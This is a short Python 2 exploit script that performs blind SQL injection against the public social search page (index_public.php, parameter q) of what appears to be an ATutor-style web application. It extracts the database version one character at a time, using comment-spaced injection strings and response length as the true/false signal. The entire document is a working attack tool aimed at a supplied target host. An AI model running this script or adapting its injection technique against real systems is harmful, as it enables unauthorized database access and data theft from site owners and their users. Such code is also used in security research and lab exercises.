import sys 
import requests 

 
		

def searchFriends_sqli(ip,inj_str):
	for j in range(32,126):
		
		target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip ,inj_str.replace("[CHAR]",str(j)))
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if (content_length > 20 ) :
			return j
	return None 
	
		
		
		
		
def main() : 
	if len(sys.argv) != 2:	
		print " usage : %s <target> "% sys.argv[0]
		sys.exit(-1)
	
	
	print " [+] Retrevieving database version .... "
	ip = sys.argv[1]
	
	for i in range(1,20):
		injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i  
		extracted_char = chr(searchFriends_sqli(ip,injection_string))
		extracted_char = str(extracted_char)
		sys.stdout.write(extracted_char)
		sys.stdout.flush()
	print "\n [+] Done ! "
	 


if __name__ == "__main__":
	main()
